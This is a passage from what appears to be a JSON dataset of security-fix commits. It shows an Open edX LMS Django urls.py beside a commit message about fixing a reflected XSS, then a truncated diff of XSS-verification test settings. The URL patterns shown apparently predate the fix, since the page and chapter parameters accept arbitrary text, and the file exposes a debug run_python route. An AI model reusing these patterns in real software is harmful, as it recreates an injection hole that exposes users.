url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."
        },
        "1162dbc18fda91b07a5942873387d60fd67b2cfc": {
            "url": "https://api.github.com/repos/jlrivera81/incr-228/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "html_url": "https://github.com/jlrivera81/incr-228/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc",
            "keyword": "XSS check",
            "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\nindex 0573565146..9f37700463 100644\n--- a/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n+++ b/pavelib/paver_tests/test_paver_bok_choy_cmds.py\n@@ -18,7 +18,7 @@ class TestPaverBokChoyCmd(unittest.TestCase):\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n@@ -101,11 +101,11 @@ def test_verify_xss(self):\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'\ndiff --git a/pavelib/utils/test/suites/bokchoy_suite.py b/pavelib/utils/test/suites/bokchoy_suite.py\nindex 19d51da7b5..327b6b9c3c 100644\n--- 